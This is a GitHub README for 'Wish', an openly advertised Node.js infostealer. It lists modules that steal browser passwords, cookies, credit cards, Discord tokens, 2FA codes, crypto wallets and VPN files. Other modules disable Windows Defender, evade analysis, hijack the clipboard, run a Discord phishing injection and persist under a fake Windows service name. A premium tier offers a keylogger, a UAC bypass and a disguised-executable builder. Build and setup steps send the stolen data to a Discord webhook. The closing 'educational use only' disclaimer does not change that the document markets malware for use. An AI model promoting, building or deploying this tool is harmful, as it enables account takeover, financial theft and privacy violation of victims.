![Header](https://github.com/k4itrun/wish/assets/103044629/767a8367-b1a8-422e-9f75-0073b8ed6922)

[shield-github-issues]: https://img.shields.io/github/issues/k4itrun/wish?style=for-the-badge&color=8E54E9
[shield-github-license]: https://img.shields.io/github/license/k4itrun/wish?style=for-the-badge&color=8E54E9
[shield-github-stars]: https://img.shields.io/github/stars/k4itrun/wish?style=for-the-badge&color=8E54E9
[shield-github-forks]: https://img.shields.io/github/forks/k4itrun/wish?style=for-the-badge&color=8E54E9
[github-assets-img-config-link]: .github/assets/config.png
[github-assets-img-system1-link]: .github/assets/system1.png
[github-assets-img-system2-link]: .github/assets/system2.png
[github-assets-img-browsers-link]: .github/assets/browsers.png
[github-assets-img-keywords-link]: .github/assets/keywords.png
[github-assets-img-sessionspotify-link]: .github/assets/sessionspotify.png
[github-assets-img-sessioninstagram-link]: .github/assets/sessioninstagram.png
[github-assets-img-sessiontiktok-link]: .github/assets/sessiontiktok.png
[github-assets-img-games-link]: .github/assets/games.png
[github-assets-img-commonfiles-link]: .github/assets/commonfiles.png
[github-assets-img-stealcodes-link]: .github/assets/stealcodes.png
[github-assets-img-tokens-link]: .github/assets/tokens.png
[github-assets-img-wallets-extensions-link]: .github/assets/wallets-extensions.png
[github-assets-img-vpns-socials-link]: .github/assets/vpns-socials.png
[github-assets-img-wish-link]: .github/assets/wish.png
[github-assets-img-files-link]: .github/assets/files.png
[github-link]: https://github.com/k4itrun/wish
[discord-server-link]: https://discord.gg/BYANEGfyCu

<div align="center">
  <a aria-label="GitHub Maintained" href="https://github.com/k4itrun/wish/blob/master/license.md">
    <img src="https://img.shields.io/badge/No-%23e3aef0?logo=github&style=flat-square&label=Maintained%3F">
  </a>
  <a aria-label="License" href="https://github.com/k4itrun/wish/blob/master/license.md">
    <img src="https://img.shields.io/github/license/k4itrun/k4itrun?color=%23e3aef0&logo=github&style=flat-square&label=License">
  </a>
  <a aria-label="Version" href="https://github.com/k4itrun/wish/releases">
    <img src="https://img.shields.io/github/v/release/k4itrun/wish?color=%23e3aef0&logo=github&style=flat-square&label=Version">
  </a>
  <a aria-label="Issues" href="https://github.com/k4itrun/wish/issues">
    <img src="https://img.shields.io/github/issues/k4itrun/wish?color=%23e3aef0&logo=github&style=flat-square&label=Issues">
  </a>
  <a aria-label="Stars" href="https://github.com/k4itrun/wish/stargazers">
    <img src="https://img.shields.io/github/stars/k4itrun/wish?color=%23e3aef0&logo=github&style=flat-square&label=Stars">
  </a>
  <a aria-label="Discord" href="https://discord.gg/A6Vu7gYE">
    <img src="https://img.shields.io/discord/903684797560397915?color=%23e3aef0&logo=discord&style=flat-square&logoColor=fff&label=Discord">
  </a>
</div>

---

## Table of Contents

1. [Overview](#overview)
   - [Features](#features-50)
   - [Premium Features](#premium-features)
2. [Getting Started](#getting-started)
   - [Requirements](#requirements)
   - [Installation](#installation)
3. [Usage](#usage)
4. [Preview](#preview)
   - [Star History](#star-history)
5. [Uninstalling](#uninstalling)
6. [Acknowledgments](#acknowledgments)
7. [Contributing](#contributing)
8. [Contact](#contact)
9. [License](#license)
10. [Disclaimer](#disclaimer)

## Overview

The most comprehensive open-source stealer based on Node.js available on GitHub. This Discord stealer utilizes a privilege escalation technique to gain access to all user sessions on Windows.

- If you're wondering where the previous "AuraThemes" repository was, it was simply abandoned by the creation of this new one.

### Features (+50)

- [Development][github-link]
  - ✨ Clean and efficient codebase.
  - 📅 Up-to-date dependencies.
  - 📦 Minimal reliance on external Node.js libraries.
- [Modules][github-link]
  - [antidebug](src/modules/antidebug/antidebug.js): 🛠️ Terminates debugging tools (incomplete).
  - [antivirus](src/modules/antivirus/antivirus.js): 🚫 Disables Windows Defender and blocks access to antivirus-related websites.
  - [antivm](src/modules/antivm/antivm.js): 🖥️ Terminates execution if running inside a virtual machine environment.
  - [browsers](src/modules/browsers/browsers.js):
    - 🌍 Captures logins, cookies, credit card details, bookmarks, autofill data, browsing history, and downloads from 37 Chromium-based browsers.
    - 🦊 Captures logins, cookies, browsing history, bookmarks, and downloads from 10 Gecko/Firefox-based browsers.
  - [sessions](src/modules/browsers/sessions.js): 📱 Extracts active sessions from platforms like Spotify, TikTok, and Instagram.
  - [clipper](src/modules/clipper/clipper.js): 💰 Monitors the clipboard for crypto addresses and replaces them.
  - [commonfiles](src/modules/commonfiles/commonfiles.js): 📂 Collects sensitive files from common directories on the system.
  - [fakeerror](src/modules/fakeerror/fakeerror.js): ❌ Displays a fake error message to trick users into thinking the program has crashed.
  - [games](src/modules/games/games.js): 🎮 Extracts session data from popular game launchers like Epic Games and Minecraft and More.
  - [hideconsole](src/modules/hideconsole/hideconsole.js): 👀 Hides the console window to run the program discreetly.
  - [injections](src/modules/injections): 💉 Injects into applications like Discord and crypto wallets to capture sensitive information.
    - [discord](src/modules/injections/discord/discord.js):
      - 🔄 Persistent startup injection (remains active even if the user attempts to remove it).
      - 📧 Captures logins, registration data, and two-factor authentication requests.
      - 🔑 Intercepts email and password change requests as well as backup code requests.
      - 🚫 Blocks QR code logins and views of connected devices.
      - 🎣 Phishing mode simulates alerts to trick users into changing their email credentials.
  - [killprocess](src/modules/killprocess/killprocess.js): 🚷 Terminates processes that are listed in a predefined blacklist.
  - [socials](src/modules/socials/socials.js): 📸 Extracts data from over 20 social media applications, stealing sensitive information from each.
  - [startup](src/modules/startup/startup.js): ⚙️ Ensures the program launches automatically when the system starts.
  - [stealcodes](src/modules/stealcodes/stealcodes.js): 🔒 Captures (2FA) codes from services like Discord, GitHub, Google, and more.
  - [system](src/modules/system/system.js): 📊 Gathers detailed system information including IP address, installed antivirus software, screenshots, CPU, GPU, RAM details, location, and saved Wi-Fi networks.
  - [tokens](src/modules/tokens/tokens.js): 🗝️ Extracts tokens from four Discord applications and over 30 browsers.
  - [vpns](src/modules/vpns/vpns.js): 🔐 Retrieves sensitive files from over 20 VPN applications installed on the system.
  - [wallets](src/modules/wallets/wallets.js): 💼 Extracts data from more than 30 browser-based cryptocurrency wallets, as well as crucial information from locally installed wallets.

### Premium Features

- Marked features: Premium
  - [ ] 📤 **Upload files**: Upload files seamlessly.
  - [ ] 🔄 **Update/Reinstall Bypass**: Bypass update and reinstallation processes.
  - [ ] 📂 **File/Session Theft**: Steal files and active sessions.
  - [ ] 💰 **Clipper Wallets**: Monitor and replace cryptocurrency wallet addresses.
  - [ ] 🎮 **Launcher Stealer**: Extract data from game launchers.
  - [ ] 🌐 **VPN and Messenger Stealers**: Capture sensitive data from VPNs and messaging apps.
  - [x] 💉 **Extension Injection**: Inject malicious extensions into browsers.
  - [x] 🚫 **UAC Bypass**: Bypass User Account Control prompts.
  - [x] 💳 **Wallet Injection**: Inject data into cryptocurrency wallets.
  - [x] 📧 **Email Injection**: Intercept and modify email communications.
  - [x] ⌨️ **Keylogger Integration**: Record keystrokes for sensitive information.
  - [x] 🔒 **Discord Injection (Force 2FA Disabled)**: Inject into Discord to disable two-factor authentication.
  - [x] 🤖 **Builder, Discord Bot, and API**: Generator to create an executable with version, copyright and legitimate application names, plus an API for interaction with the bot, injections and the Stealer.

## Getting Started

### Requirements

#### Install Git LTS

- `Download Git` Visit the official <a href="https://git-scm.com/" target="_blank">Git LTS site</a> to download the (LTS) version.

#### Install Node.js LTS

- `Download Node.js` Visit the official <a href="https://nodejs.org/en" target="_blank">Node.js LTS site</a> to download the Long-Term Support (LTS) version.

#### Install the Visual C++ Build Environment

- `For Visual Studio 2019 or later` Install the `Desktop development with C++` workload via <a href="https://visualstudio.microsoft.com/thank-you-downloading-visual-studio/?sku=Community" target="_blank">Visual Studio Community</a>.
- `For versions earlier than Visual Studio 2019` Use the <a href="https://visualstudio.microsoft.com/thank-you-downloading-visual-studio/?sku=BuildTools" target="_blank">Visual Studio Build Tools</a> and select the `Visual C++ build tools` option during installation.

#### Hardware

JavaScript, in its native form, lacks direct control over hardware. Therefore, this project relies on modules that utilize `C++`, which does provide direct access to hardware components. By leveraging the [node-gyp](https://github.com/nodejs/node-gyp) library, I can interface with `C++` and perform operations that JavaScript cannot accomplish directly.

to correctly install node-gyp go to its repo: [node-gyp](https://github.com/nodejs/node-gyp?tab=readme-ov-file#on-windows)

### Installation

- Follow these steps to have it or watch the video <a href="https://www.youtube.com/watch?v=4MWMONVS6J4" target="_blank">YouTube!</a>

## Usage

1. If you want to create an **Executable** all at once, simply do:

- If an error occurs in the create of your Executable: Try to open the `CMD` with `Administrator Permissions`

```bash
git clone https://github.com/k4itrun/wish.git && cd wish
```

```bash
npm install pnpm -g && pnpm setup
```

```bash
node --run builder:install && node --run builder:start
```

2. But if you just want to **Test the code**, just do:

- Edit `config.js` for your Discord webhook and crypto addresses.

![][github-assets-img-config-link]

```bash
git clone https://github.com/k4itrun/wish.git && cd wish
```

```bash
npm install pnpm -g && pnpm setup
```

```bash
node --run src:install && node --run src:start
```

3. You can also use (`electron-builder`, `pkg`, `nexe`, etc...) to build your own executable.

## Preview

![][github-assets-img-system1-link]

![][github-assets-img-system2-link]

![][github-assets-img-browsers-link]

![][github-assets-img-keywords-link]

![][github-assets-img-sessionspotify-link]

![][github-assets-img-sessioninstagram-link]

![][github-assets-img-sessiontiktok-link]

![][github-assets-img-commonfiles-link]

![][github-assets-img-stealcodes-link]

![][github-assets-img-tokens-link]

![][github-assets-img-wallets-extensions-link]

![][github-assets-img-vpns-socials-link]

![][github-assets-img-games-link]

![][github-assets-img-wish-link]

![][github-assets-img-files-link]

### Star History

<a href="https://star-history.com/#k4itrun/wish&Timeline">
  <picture>
    <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/svg?repos=k4itrun/wish&type=Timeline&theme=dark" />
    <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/svg?repos=k4itrun/wish&type=Timeline" />
    <img alt="Star History Wish St34l3r" src="https://api.star-history.com/svg?repos=k4itrun/wish&type=Timeline" />
  </picture>
</a>

## Uninstalling

1. Open PowerShell as Administrator.

2. Terminate processes:

```bash
taskkill /f /t /im Wish.exe
taskkill /f /t /im WindowsSecurityHealthService.exe
```

3. Remove from startup:

```bash
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Security Health Service" /f
```

## Acknowledgments

This project draws inspiration from various infostealers. Special thanks to:

- [Stealerium](https://github.com/Stealerium/Stealerium): Based on clipper and keylogging, with plans for future versions.
- [hackirby](https://github.com/hackirby/skuld): Features decryption and code organization functions.
- [addi00000](https://github.com/addi00000/empyrean): Includes browser-related embed customizations.
- [can-kat](https://github.com/can-kat/cstealer/blob/main/cstealer.py): Focuses on extensions and wallet path detection.

> [!WARNING]
> I am not currently supporting this project in recommended updates, in the future maybe yes, for now you will have this minimalist version.

## Contributing

**We greatly appreciate any contributions to this project!** Whether you want to **open new issues**, **submit pull requests**, or **share suggestions for improvements**, your input is invaluable. We encourage you to refer to our **[Contributing Guidelines](CONTRIBUTING.md)** to facilitate a **seamless collaboration process.**

You can also support the development of this software through a donation, helping me bring new optimal and improved projects to life.

☕ **[Thank you for your interest and support](https://ko-fi.com/A0A11481X5)!**

## Contact

For any inquiries or support, you can reach out via [billoneta@proto.me](mailto:billoneta@proto.me) or join our [Discord Server](https://discord.gg/A6Vu7gYE).

## License

This software is licensed under the [MIT License](LICENSE).

## Disclaimer

### Important Notice: Educational Use Only.

This tool is designed solely for educational purposes. Any misuse of this tool is strictly prohibited. By using this tool, you acknowledge and accept these terms.

### User Accountability:

By utilizing this tool, you take full responsibility for your actions. The creator disclaims any liability for misuse. It is your responsibility to ensure that your use of this software complies with all applicable laws and regulations.

### No Assistance:

The creator will not provide assistance or support for any misuse of this tool. Any inquiries related to harmful or illegal activities will be ignored.

### Terms Acceptance:

By using this tool, you agree to abide by this disclaimer. If you do not agree with these terms, please do not use the software.
